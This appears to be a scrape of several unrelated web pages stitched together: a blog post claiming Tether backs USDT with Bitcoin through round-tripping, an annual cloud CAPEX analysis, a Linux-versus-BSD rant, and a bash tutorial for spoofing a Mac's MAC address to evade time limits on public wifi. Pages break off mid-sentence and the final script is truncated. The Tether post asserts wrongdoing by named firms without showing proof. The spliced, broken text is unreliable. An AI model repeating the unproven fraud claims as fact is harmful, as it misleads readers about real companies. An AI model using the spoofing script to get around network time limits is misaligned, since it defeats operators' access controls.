<p>Given the rise of USDT in circulation has increased Bitcoin supply and reduced its turnover, the impact of the Tether collateral flippening on $BTC should have been disastrous. Yet, Bitcoin is up tenfold since the start of the trend. How is this possible?</p>



<p>The knee-jerk response from Bitcoiners will be that a lot of new demand for Bitcoin has emerged at the same time, citing Michael Saylor’s MicroStrategy and Grayscale. But we’re talking about 1.3 million Bitcoins (released from collateral and newly mined) in less than a year! That’s one hell of an exogenous event that should have crushed the price, right?</p>



<p>Well, no – because the event wasn’t exogenous; it was decided by the crypto community insiders – mostly Binance, Bitfinex and Tether. They knew that by releasing all this Bitcoin into the market, they would crush the price. So, they didn’t.</p>



<p>If you were to follow Tether’s own advertised rules, where new USDTs are issued only against matching USD deposits, the Tether collateral flippening should have followed this path:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08.png 878w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08-300x141.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08-768x362.png 768w" sizes="(max-width: 878px) 100vw, 878px"></figure>



<p>Instead, what happened is this:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34.png 853w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34-300x69.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34-768x176.png 768w" sizes="(max-width: 853px) 100vw, 853px"></figure>



<p>This path has two huge advantages:</p>



<ul><li>no fiat is needed</li><li>no Bitcoins are released into Supply</li></ul>



<p>It also has one small disadvantage:</p>



<ul><li>Tether has to lie about how USDTs are issued and what its reserves are made of</li></ul>



<p>Note that this disadvantage can be easily solved by round-tripping, a practice that was once dear to Wirecard, where a very small amount of fiat circulates a lot of times between everyone involved, to make it look like there are transactions. Meaning that Binance doesn’t send Bitcoins in exchange of USDT directly to Tether. They first put these Bitcoins as collateral for a loan from Tether, then wire the proceeds of the loan to Tether, and get USDTs in return. Exactly the same result as buying Bitcoin with USDT, but very different appearances and paper trail.</p>



<h3>USDTs are backed by Bitcoin</h3>



<p>More accurately, Tether’s reserves are loans to exchanges, collateralized by Bitcoin. The Bitcoins that were used as collateral for margin trading, are now used as collateral for USDT. This way, exchanges know that USDTs are actually worth something, and accept to maintain the 1:1 peg. And no fiat needs to be deposited at Tether, a small and shady company with no offices, under investigation by the NYAG, with a shaky banking relationship with Deltec that’s not even a real bank.</p>



<p>This is the only way the Tether collateral flippening wouldn’t have crushed Bitcoin’s price. The question that remains to be answered is, if exchanges accept that Tether issues USDTs backed by Bitcoin, why not print some USDT out of thin air to buy Bitcoin with it, and pump $BTC in an effort to ignite another round of FOMO?</p>

<p>It is time for our annual bulletin to <a href="https://www.platformonomics.com/tag/capex/">CAPEX obsessives</a> (previous updates from <a href="https://www.platformonomics.com/www.platformonomics.com/2017/04/follow-the-capex-cloud-table-stakes/">2016</a>, <a href="https://www.platformonomics.com/2018/04/follow-the-capex-cloud-table-stakes-2017-edition/">2017</a>, <a href="https://www.platformonomics.com/2019/02/follow-the-capex-cloud-table-stakes-2018-edition/">2018</a>, <a href="https://www.platformonomics.com/2020/02/follow-the-capex-cloud-table-stakes-2019-edition/">2019</a> as well as <a href="https://www.platformonomics.com/tag/capex/">earlier</a> installments). The hashtag for CAPEX 2020 is “#bonkers”.</p>



<p><strong>The three hypercloud companies – Amazon, Google, and Microsoft – collectively spent almost $97 billion on CAPEX in 2020</strong>, up 32% from 2019’s $73.5 billion. Amazon and Microsoft’s spending again hit new highs (bonkers new highs in Amazon’s case) while Google’s spending declined for the second year in a row. <strong>Amazon spent more on CAPEX than <u>any </u>company (not just cloud companies) in 2020 </strong><a href="#*" data-type="internal" data-id="#*">[*]</a><strong>.</strong></p>



<p>Standard caveat: The reported numbers are the companies’ total CAPEX spend, not just cloud infrastructure, so includes land, office buildings, <a href="https://www.geekwire.com/2020/emptied-pandemic-overtaken-cranes-microsoft-hq-symbol-changing-world/">campus redevelopments</a>, warehouses, <a href="https://www.geekwire.com/2021/amazon-adds-palm-reading-biometric-id-scanner-physical-retail-stores-seattle/">panopticonvenience stores</a>, manufacturing tooling, self-driving cars, delivery trucks, flying machines, <a href="https://www.geekwire.com/2020/amazons-project-kuiper-drops-hints-customer-terminals-satellite-internet/">satellite constellations</a>, hardware that both is and is not required for quantum computing, and – the dream is admittedly on life support – a Google space elevator. The numbers include finance leases for both Amazon and Microsoft, as well as build-to-suit leases for Amazon (these are debt instruments used to finance specific CAPEX expenditures, namely servers and buildings).</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-5.png"><img loading="lazy" width="868" height="504" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-5.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-5.png 868w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-5-300x174.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-5-768x446.png 768w" sizes="(max-width: 868px) 100vw, 868px"></a></figure>



<p><strong>In 2020, Amazon’s CAPEX was up a mere 69% to just shy of an absolutely bonkers $54 billion, Google’s spend declined over 5% to $22.3 billion and Microsoft’s increased 14% to $20.6 billion. </strong>Amazon (company slogan: “a penny of free cash flow is a terrible thing to waste on abstract accounting constructs like profits”) is accelerating its spending and may soon achieve orbital escape velocity on the back of its CAPEX trajectory, rendering Jeff Bezos’ personal space program unnecessary.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-6.png"><img loading="lazy" width="940" height="572" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-6.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-6.png 940w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-6-300x183.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-6-768x467.png 768w" sizes="(max-width: 940px) 100vw, 940px"></a></figure>



<p>It is beyond bonkers that <a href="https://arstechnica.com/information-technology/2013/03/vmware-targets-rival-bookseller-amazon-with-its-own-public-cloud/">“a company that sells books”</a> spends more on CAPEX than any other company <a href="#*" data-type="internal" data-id="#*">[*]</a>. And the idea that our other two “software companies” have a CAPEX spend in the same league or beyond the biggest automakers, energy companies, semiconductor manufacturers, and telcos in the world is likewise bonkers.</p>



<p><a name="*">[*]</a> Where “any other company” is defined as the random set I looked up and charted above. Are there other big spenders I’ve missed? I didn’t look at Chinese companies, mostly because I’m lazy, but also because often their investments are non-economic, accounting dodgy, and audits optional, even for companies listed in the US (if only domestic companies had that luxury, but Wall Street still dreams of selling a collaterized debt obligation to each and every person in China).</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-7.png"><img loading="lazy" width="854" height="504" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-7.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-7.png 854w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-7-300x177.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-7-768x453.png 768w" sizes="(max-width: 854px) 100vw, 854px"></a></figure>



<p><strong>The three hyperclouds’ cumulative CAPEX spend since 2000 is almost $444 billion</strong>, with over $170 billion of that occurring in the last two years. Efforts to find an amusing comparable failed.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-8.png"><img loading="lazy" width="856" height="506" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-8.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-8.png 856w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-8-300x177.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-8-768x454.png 768w" sizes="(max-width: 856px) 100vw, 856px"></a></figure>



<p>As a percentage of revenue, hypercloud CAPEX is clustered between 12 and 14% of revenue, with Amazon edging out Microsoft for the top spot this year.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-14.png"><img loading="lazy" width="724" height="436" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-14.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-14.png 724w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-14-300x181.png 300w" sizes="(max-width: 724px) 100vw, 724px"></a></figure>



<p>Azure and Google Cloud (which includes both Google Cloud Platform and whatever they are calling Google Docs this week) have both seen growth accelerate slightly since “<a href="https://www.platformonomics.com/2020/03/the-geopolitical-game-board-march-2020/">a bat out of Wuhan</a>” became the new “butterfly effect”. The AWS growth rate is lower, but they grew revenue by over $10 billion in 2020, so their dollar growth alone is bigger than GCP.</p>



<h2><strong>Amazon #bonkers</strong></h2>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-10.png"><img loading="lazy" width="858" height="504" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-10.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-10.png 858w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-10-300x176.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-10-768x451.png 768w" sizes="(max-width: 858px) 100vw, 858px"></a></figure>



<p>By most standards, Amazon had an absolutely magnificent pandemic year (some might say “bonkers”). Revenue growth nearly doubled to 38% from 20% growth the previous year, bringing in over $386 billion. Profits almost doubled. And they spent the aforementioned bonkers CAPEX to support that growth while providing an essential lifeline to hundreds of millions of people in isolation amidst a global pandemic. Not bad.</p>



<p>Amazon’s cash out of pocket for CAPEX exploded: 2020 spending was 238% of the previous year, with over $23 billion incremental spent on hard assets. Debt-funded CAPEX declined 8% (with capital leases — probably AWS servers — down 15% while the smaller sum of built-to-suit real estate leases increased as they grew their warehouse space by 50%). Over the past couple years, Amazon’s CAPEX outlay was split roughly half cash and half debt. In 2020, the cash spend ballooned to 75%. There clearly was a push to spend as much as possible on hard assets (“Quick, <a href="https://www.geekwire.com/2021/amazon-air-makes-first-outright-purchase-planes-buying-11-boeing-jets-expand-cargo-fleet/">buy as many wide-body airplanes</a> as you can before the end of the year!”).</p>



<p>Amazon has always managed for free cash flow, as opposed to profits. Despite the numbers above, the pandemic year was an all-time low when measured against their financial priorities. Even though they stuffed an additional $23 billion into CAPEX, the company was unable to reinvest most of its cash flow into the business and (embarrassingly) reported profits of over $21 billion. One could almost speculate that Bezos’ departure as CEO is not so much his choice, but reflects the board’s disappointment in his dismal 2020 cash flow performance.</p>



<p>At this point, AWS accounts for a small fraction of Amazon’s CAPEX spending, and examining overall Amazon CAPEX – except as an excuse to use the word bonkers– is ever less relevant to cloud infrastructure discussions. The finance leases historically have been the best tell on AWS cloud infrastructure investments, as they reflected server purchases.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-11.png"><img loading="lazy" width="724" height="436" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-11.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-11.png 724w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-11-300x181.png 300w" sizes="(max-width: 724px) 100vw, 724px"></a></figure>



<p>If we look at AWS revenue vs. finance leases, we can see they have decoupled, particularly in the last two years. The company probably paid cash in 2020 to convert some of its pandemic windfall into servers, and has less need to use debt to realize its CAPEX ambitions.</p>



<h2><strong>Google</strong></h2>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-12.png"><img loading="lazy" width="940" height="474" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-12.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-12.png 940w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-12-300x151.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-12-768x387.png 768w" sizes="(max-width: 940px) 100vw, 940px"></a></figure>



<p>Following Amazon last year, Google is now moving to depreciating their servers over four years:</p>



<blockquote><p>As noted in our earnings press release, we have adjusted the estimated useful lives of servers and certain network equipment starting in 2021. We expect these changes will favorably impact our 2021 operating results by approximately $2.1 billion for assets as of year-end 2020.</p></blockquote>



<p>That bold bean counter move has a multi-billion impact on their accounting earnings, but as seen by their CAPEX/revenue number, Google has been on a four-year server cycle for a long time. Yet more evidence that accounting can be distracting. CAPEX obsessives care about the gross spend on silicon, glass, steel and concrete, and don’t waste time netting out accounting abstractions like depreciation.</p>



<p>Based on that four-year cycle, we expect Google’s next CAPEX up-cycle in 2022. The company has highlighted they are investing heavily in Google Cloud, but we don’t see it in the CAPEX numbers. Even as they <a href="https://www.itprotoday.com/iaaspaas/google-expanding-google-cloud-regions-2021" data-type="URL" data-id="https://www.itprotoday.com/iaaspaas/google-expanding-google-cloud-regions-2021">expand their footprint</a> into more geographies, the infrastructure for search and YouTube are vastly larger. Google’s commentary on Google Cloud emphasizes most of that investment is in people.</p>



<p>Google (why does the Alphabet conceit still exist?) also stopped breaking out CAPEX for Other Bets this year, as Loon joined Makani and Titan in the aerial wing of the <a href="https://killedbygoogle.com/">Killed By Google</a> cemetery. Google continues to <a href="https://www.platformonomics.com/2020/07/can-brian-hall-fix-what-ails-google-cloud/">shed its Googley-ness</a> and will fail to deliver a space elevator, calling into question their entire existence and social contract compliance. I await Congressional hearings on what went wrong with the space elevator.</p>



<h2><strong>Microsoft</strong></h2>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-13.png"><img loading="lazy" width="940" height="474" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-13.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-13.png 940w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-13-300x151.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-13-768x387.png 768w" sizes="(max-width: 940px) 100vw, 940px"></a></figure>



<p>Microsoft’s CAPEX remains boring, monotonic and inscrutable, as I have not been able to tease apart their spending on Azure, Office 365 and Bing (which may be a distant number two to Google, but search still has huge infrastructure requirements to store all those copies of the entire Web). There was a brief moment of <a href="https://www.platformonomics.com/2020/10/pandemic-capex-q3-2020-update/">excitement</a> right after the pandemic broke when Microsoft was short on servers due to supply chain disruptions, but that was remedied the next quarter and boringness restored. Hopefully they can do more CAPEX-wise this year to stand out in this annual commentary.</p>

<p>As an operating system GNU/Linux has become a mess because of the fragmented nature of the project, the bloatware in the kernel, but mainly because of the manipulation by corporate interests. There exist <a href="https://unixsheikh.com/articles/technical-reasons-to-choose-freebsd-over-linux.html">several technical reasons</a> for when a migration from GNU/Linux to BSD make sense, but this article isn't about that, it's an "analyzes" of the current status in Linux-land, and it is an opinionated rant, more than anything else.</p>

<h2 id="introduction">Introduction</h2>
<p>In the past I have always been a favorite of choosing operating system and tools based upon technical merit. However, in today's world of companies like Microsoft, Apple, Google, and many others, compromising user privacy, and conducting controversial activities, I don't believe that to be the right cause of action.</p>
<p>Proprietary operating systems like <a href="https://en.wikipedia.org/wiki/Windows_10#Privacy_and_data_collection">Microsoft Windows 10</a>, <a href="https://gist.github.com/iosecure/357e724811fe04167332ef54e736670d">Apple MacOS</a>, and <a href="https://en.wikipedia.org/wiki/Android_%28operating_system%29#Security_and_privacy">Google Android</a> have become famous for their ill conduct, and even companies like Lenovo is using UEFI boot to inject custom Windows components, so that the system can phone home to Lenovo.</p>
<p>I have been a proponent for the open source alternatives, like GNU/Linux and BSD, for a very long time. Not only that, I also believe that the open source alternatives are much better in many technical areas.</p>
<p>I have also always been very much against <a href="https://www.unixsheikh.com/articles/the-typical-discussions-about-bsd-vs-linux.html">The typical discussions about BSD vs Linux</a>, and as I wrote in my article back then, I have always believed that the different open source projects can help each other and cooperate, and that end-users should only debate such issues from a technical stand point rather than personal preference.</p>
<p>Whenever it has been possible, I have proposed people, both private and in the industry, to change the operating systems they use to open source alternatives, and when people have been receptive to my advocacy I have helped them migrate from Microsoft Windows on their workstations to BSD or Linux. And likewise on the server side. This has been a truly successful endeavor and I have honestly never experienced a dissatisfied person or company.</p>
<p>However, things are beginning to change in the GNU/Linux world as more and more corporations want to control the direction of Linux as an operating system. Due to the structure and organization of GNU/Linux as an operating system, it is unfortunately susceptible to these influences, and while it is still open source, and still not anywhere near the bad things that is going on with the proprietary alternatives, some opt-out features have slowly been introduced into both the kernel and systemd.</p>
<p>You can still choose to opt-out of these features and go your merry way, but as an open source enthusiast and proponent, and as a privacy concerned individual, perhaps the better approach is to migrate systems to something where you don't have to concern yourself with "creepware".</p>
<p>As a system administrator I don't want to worry about whether I am going to be surprised the next time I upgrade a system, and I don't want to keep a list of spyware I have to remember to opt-out of whenever I run one of these systems.</p>
<p>Several Linux distributions have decided (not only because of privacy opt-out issues, but other issues as well) to implement <a href="https://en.wikipedia.org/wiki/Category:Linux_distributions_without_systemd">other init solutions than systemd</a>, but with the situation going on in the kernel development, and with many third party applications becoming more and dependent upon systemd, the problems are spreading to other parts of the operating system and I believe this is becoming an uphill battle.</p>
<p>From a community perspective, and from a security perspective, I don't believe the future of GNU/Linux looks very bright, and as a possible alternative solution I suggest migrating everything (when possible) to something a bit more sane, like one of the BSD projects.</p>

<h2 id="fragmented">Linux is fragmented</h2>
<p>In 1983 Richard Stallman announced his intent to start coding the GNU Project in a Usenet message. By June 1987, the project had accumulated and developed free and open source software for an assembler, an almost finished portable optimizing C compiler (GCC), an editor (GNU Emacs), and various Unix utilities, such as ls, grep, awk, make and ld.</p>
<p>In 1991, the Linux kernel appeared, developed outside the GNU project by Linus Torvalds, and in December 1992 it was made available under version 2 of the GNU General Public License. Combined with the operating system utilities already developed by the GNU project, it became the GNU/Linux operating system, better known as just "Linux".</p>
<p>Then came the Linux distributions. Different projects took the Linux kernel, the GNU tools and libraries, additional third party software, documentation, the X Window System, a window manager, and a desktop environment, and combined those components into the distributions. Different distributions focused on different goals, some put focus on the desktop while others put their main focus on servers, and again others tried to provide a multi-purpose operating system.</p>
<p>In the past all these different components and projects where developed by open source enthusiasts and communities and the passion for programming and open source was the driving force.</p>
<p>This is no longer the case! Please see <a href="https://unixsheikh.com/articles/the-real-motivation-behind-systemd.html">The real motivation behind systemd</a>.</p>
<p>Linus Torvalds has many times made it very clear that he doesn't care about what goes on in the "Linux world", all he cares about is the kernel development, and on January 6, 2020 in the "Moderated Discussions" forum at <a href="https://www.realworldtech.com/forum/?threadid=189711&amp;curpostid=189841">realworldtech.com</a>, Linus Torvalds answered a user's question, with an absolute jaw-dropping comment, about a year-old kernel maintenance controversy that heavily impacted the <a href="https://zfsonlinux.org/">ZFS on Linux</a> project.</p>
<p>After answering the user's actual question, Torvalds went on to make very wrong and damaging claims about the ZFS filesystem. Torvalds said:</p>
<blockquote>
It (ZFS) was always more of a buzzword than anything else.
</blockquote>
<p>By that statements Linus Torvalds has just reduced more that 15 years of development of one of the most robust and popular filesystems in the world into a "buzzword"!</p>
<p>ZFS is described as "The last word in filesystems". It is a combined filesystem and logical volume manager originally designed by Sun Microsystems. ZFS is a stable, fast, secure, and future-proof filesystem. It is scalable, and includes extensive protection against data corruption, support for high storage capacities, a maximum 16 Exabyte file size, and a maximum 256 Quadrillion Zettabytes storage with no limit on number of filesystems (datasets) or files, efficient data compression, snapshots and copy-on-write clones, continuous integrity checking and automatic repair, RAID-Z, native NFSv4 ACLs, and can be very precisely configured.</p>
<p>The two main implementations, by Oracle and by the <a href="https://en.wikipedia.org/wiki/OpenZFS">OpenZFS</a> project, are extremely similar, making ZFS widely available within Unix-like systems.</p>
<p>As mentioned in the Wikipedia article, OpenZFS is an umbrella project aimed at bringing together individuals and companies that use the ZFS file system and work on its improvements, aiming as well at making ZFS more widely used and developed in an open-source manner. OpenZFS brings together developers from the illumos, Linux, FreeBSD, and macOS platforms, and a wide range of companies. High-level goals of the project include raising awareness of the quality, utility and availability of open-source implementations of ZFS, encouraging open communication about ongoing efforts toward improving open-source variants of ZFS, and ensuring consistent reliability, functionality and performance of all distributions of ZFS.</p>
<p><a href="https://github.com/zfsonlinux/zfs/commits/master">OpenZFS on Linux</a>, which is the Linux part of the project, has currently 345 active contributors with more that 5.600 commits, and commits are being made on an almost daily basis!</p>
<p>Some of the worlds biggest CDN and data storage services runs ZFS on either FreeBSD or Linux!</p>
<p>In another situation Linus Torvalds gave an interview on <a href="https://www.youtube.com/watch?v=mysM-V5h9z8">TFiR: open source and Emerging Tech YouTube channel</a> about Linux on the desktop in which he makes another amazing statement saying that Linux still isn't ready for the desktop and that perhaps <a href="https://en.wikipedia.org/wiki/Chrome_OS">Chrome OS</a> is the solution to that problem.</p>
<p>These and many other statements by Linus Torvalds show that Linux as an operating system has no real direction and no clear management because the kernel development is performed in isolation from the rest of the Linux world.</p>
<p>Linus Torvalds is generally also very open to the rapid influence by corporate interests and his perspective on security is also worrying.</p>
<p>In 2009 Linus Torvalds admitted that the kernel development is getting out of control.</p>
<blockquote>
We're getting bloated and huge. Yes, it's a problem ... Uh, I'd love to say we have a plan ... I mean, sometimes it's a bit sad that we are definitely not the streamlined, small, hyper-efficient kernel that I envisioned 15 years ago ... The kernel is huge and bloated, and our icache footprint is scary. I mean, there is no question about that. And whenever we add a new feature, it only gets worse.
</blockquote>
<p>At LinuxCon 2014, he said that he thinks the bloat situation is better because modern PCs are a lot faster!</p>
<blockquote>
We've been bloating the kernel over the last 20 years, but hardware has grown faster.
</blockquote>
<p>This is a very problematic attitude.</p>
<p>When software gets bloated it not only becomes more insecure and more error prone, but it also becomes much slower. Thinking that the problem goes away because hardware becomes faster is an immature attitude. In this day and age we need to optimize software so that less power is required, we need to save power and limit pollution.</p>
<p>In a 2007 interview "Why I quit": kernel developer Con Kolivas he stated:</p>
<blockquote>
If there is any one big problem with kernel development and Linux it is the complete disconnection of the development process from normal users. You know, the ones who constitute 99.9% of the Linux user base. The Linux kernel mailing list is the …</blockquote></article></div>

  <p>For a while, I’ve had notes from <a href="https://www.online-tech-tips.com/computer-tips/how-to-change-mac-address/">Change or Spoof a MAC Address in Windows or OS X</a> saved, so if I am using a wifi connection that limits me to thirty minutes or an hour, I can “spoof” a new MAC address, and when I re-connect to the wifi, the Access Point thinks I’m on a new, unique device.</p>

<p>For the record - when I’m posted up at a coffee shop for an extended period of time, I make sure to <em>buy products regularly</em> in payment for my time. So, if you’re spoofing your MAC address to use wifi for a longer period of time, maybe make sure to spend $5 or $10 when you run the script.</p>

<p>Now, in case you think that I’m actually saving myself time here, I’m totally not. Here’s why:</p>

<p><img src="https://imgs.xkcd.com/comics/automation.png" alt="XKCD Automation" title="'Automating' comes from the roots 'auto-' meaning 'self-', and 'mating', meaning 'screwing'."></p>

<p><em><a href="https://xkcd.com/1319/">XKCD: Automation</a></em></p>

<p>And:</p>

<p><img src="https://imgs.xkcd.com/comics/is_it_worth_the_time.png" alt="XKCD Is it worth the time?" title="Don't forget the time you spend finding the chart to look up what you save. And the time spent reading this reminder about the time spent. And the time trying to figure out if either of those actually make sense. Remember, every second counts toward your life total, including these right now."></p>

<p><em><a href="https://xkcd.com/1205/">XKCD: Is it worth the time?</a></em></p>

<p>Here’s the steps, for someone who’s on a MAC, to spoof your MAC address:</p>
      <h3 id="get-your-current-mac-address">
        
        
          Get your current MAC address <a href="#get-your-current-mac-address">#</a>
        
        
      </h3>
    

<p>Hold down <code>option</code> key, click your wifi icon:</p>

<p><img src="https://josh.works/images/2019-12-11-bash-basics-01.jpg" alt="wifi details"></p>
      <h3 id="figure-out-which-adapter-your-machine-is-using-to-connect-to-the-wifi">
        
        
          Figure out which adapter your machine is using to connect to the wifi <a href="#figure-out-which-adapter-your-machine-is-using-to-connect-to-the-wifi">#</a>
        
        
      </h3>
    

<div><div><pre><code>ifconfig en0 | <span>grep </span>ether <span># one of these will return a MAC address that matches</span>
ifconfig en1 | <span>grep </span>ether <span># the value you saw when looking for your current</span>
ifconfig en2 | <span>grep </span>ether <span># mac address.</span>
ifconfig en3 | <span>grep </span>ether <span># Keep incrementing the `en0` value until you run out of </span>
                          <span># devices</span>
</code></pre></div></div>

<p>Here’s me working through the list:</p>

<p><img src="https://josh.works/images/2019-12-11-basic-bash-02.jpg" alt="checking all ports"></p>

<p>For me, the very first result matched the MAC address I got from <code>option+click</code>ing the wifi network.</p>

<p>That means I’ll be using <code>en0</code> as the [E]ther[N]et adapter I’ll update shortly.</p>

<!--more-->
      <h3 id="generate-a-random-new-mac-address">
        
        
          Generate a random new MAC address <a href="#generate-a-random-new-mac-address">#</a>
        
        
      </h3>
    

<p>A MAC address has a standard-looking format.</p>

<p>It looks like six blocks of two digits, which happen to be <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal representations</a> of <code>00000000</code> through <code>11111111</code>.</p>

<p>Here’s some randomly-generated MAC addresses:</p>

<div><div><pre><code>e2:81:f6:f6:f9:e8
1f:24:37:47:d6:25
03:20:3f:48:46:ad
</code></pre></div></div>

<p>To generate a random string of characters that produces a <a href="http://sqa.fyicenter.com/1000208_MAC_Address_Validator.html">valid MAC address</a>, run:</p>

<div><div><pre><code>openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
</code></pre></div></div>

<p>And boom. You’ve got a MAC address.</p>

<p>Now we need to update our current MAC address to this new MAC address.</p>
      <h3 id="set-current-mac-address-to-temporarynew-mac-address">
        
        
          Set current mac address to temporary/new MAC address <a href="#set-current-mac-address-to-temporarynew-mac-address">#</a>
        
        
      </h3>
    

<p>You can use <code>ifconfig</code> to set the ethernet address (is that interchangable with the MAC address?) to the randomly-generated string you got from the <code>openssl</code> command:</p>

<div><div><pre><code><span># you need to sudo it, unfortunately. No quotes around the mac address</span>
<span>sudo </span>ifconfig en0 ether xx:xx:xx:xx:xx:xx

<span># here's the full command</span>
<span>sudo </span>ifconfig en0 ether 8c:85:90:5a:79:56
</code></pre></div></div>

<p>And with that, you can re-connect to the wifi network, and it <em>should</em> recognize you as a new device, and let you onto the network.</p>

<p>Here’s what I first ended up with:</p>

<div><div><pre><code><span>#!/bin/bash</span>

<span>echo</span> <span>"Hi! lets change our mac address."</span>
<span>echo</span> <span>"Step 1: hold down option key, click wifi logo. Note the mac address"</span>
<span>echo</span> <span>"Step 2: click 'disconnect from network' "</span>
<span>echo</span> <span>"Step 3: note which ethernet adapter lines up with the mac address you just saw"</span>

<span>en1</span><span>=</span><span>$(</span> ifconfig en1 | <span>grep </span>ether <span>)</span>
<span>en2</span><span>=</span><span>$(</span> ifconfig en2 | <span>grep </span>ether <span>)</span>
<span>en3</span><span>=</span><span>$(</span> ifconfig en3 | <span>grep </span>ether <span>)</span>
<span>en4</span><span>=</span><span>$(</span> ifconfig en4 | <span>grep </span>ether <span>)</span>
<span>en5</span><span>=</span><span>$(</span> ifconfig en5 | <span>grep </span>ether <span>)</span>

<span>echo </span>en0 is: <span>$en0</span>
<span>echo </span>en1 is: <span>$en1</span>
<span>echo </span>en2 is: <span>$en2</span>
<span>echo </span>en3 is: <span>$en3</span>
<span>echo </span>en4 is: <span>$en4</span>
<span>echo </span>en5 is: <span>$en5</span>

<span>read</span> <span>-p</span> <span>'Step 4: Enter which ethernet device lined up with the given mac address: '</span> ether_adapter
<span>export </span><span>ether_adapter</span><span>=</span><span>$ether_adapter</span>

<span>mac</span><span>=</span><span>$(</span> openssl rand <span>-hex</span> 6 | <span>sed</span> <span>"s/</span><span>\(</span><span>..</span><span>\)</span><span>/</span><span>\1</span><span>:/g; s/.</span><span>$/</span><span>/"</span> <span>)</span>
<span>export </span><span>mac</span><span>=</span><span>$mac</span>

<span>echo</span> <span>"btw, here's the new mac address we're going to use: </span><span>$mac</span><span>"</span>
<span>echo</span> <span>"OK, we will change the mac address associated with: </span><span>$ether_adapter</span><span>"</span>

<span>old_mac</span><span>=</span><span>$(</span> ifconfig <span>$ether_adapter</span> | <span>grep </span>ether <span>)</span>

<span>echo</span> <span>"The old value was: </span><span>$old_mac</span><span>"</span>

<span>sudo </span>ifconfig <span>$ether_adapter</span> ether <span>$mac</span>

<span>new_mac</span><span>=</span><span>$(</span> ifconfig <span>$ether_adapter</span> | <span>grep </span>ether <span>)</span>

<span>echo</span> <span>"The new value is: </span><span>$new_mac</span><span>"</span>
<span>echo</span> <span>"go ahead and re-connect to the wifi. You should be able to join the network."</span>
</code></pre></div></div>

<p>Believe it or not, this script was far from perfect.</p>

<p>First off, not all randomly-generated mac addresses are valid, even though they were passing an online mac address validator I was testing against. <a href="https://askubuntu.com/a/536221">AskUbuntu</a> nicely shared what was going on.</p>

<p>I didn’t want to deal with manually building a valid MAC address; I just noticed that about 2 out of 3 attempts to change my mac address, using the above script, the MAC address didn’t change.</p>

<p>So, my next version of this script pulls the <code>generate mac address</code> and <code>set current mac address to generated mac address</code> steps into a function, and keeps calling the function until the mac address has changed.</p>

<p>Why be elegant and precise when you can brute force a crappy solution?</p>

<p>Here’s my finished “solution”:</p>

<div><div><pre><code><span>#!/bin/bash</span>
<span># skipping some lines</span>

<p>and this seems to work pretty well:</p>

<p><img src="https://josh.works/images/2019-12-17-bash_script_success.jpg" alt="success"></p>

<p>I hope that in the near future, I’ll look at this bash script and have many ways to improve it. For now, it’ll do the trick.</p>

<p>Following <a href="https://twitter.com/serent/status/1359208380435361792">this tweet</a> by <code>@serent</code>, I updated the script a little. To generate a valid MAC address:</p>

<span>-  mac=$( openssl rand -hex 6 | sed "s/\(..\)/\1:/g; s/.$//" )

</span>   export mac=$mac

</code></pre></div></div>

    <article>
  
  <p>Nov 11, 2020</p>
  <p>Some time ago I wrote a reddit comment explaining the benefits of IDEs.
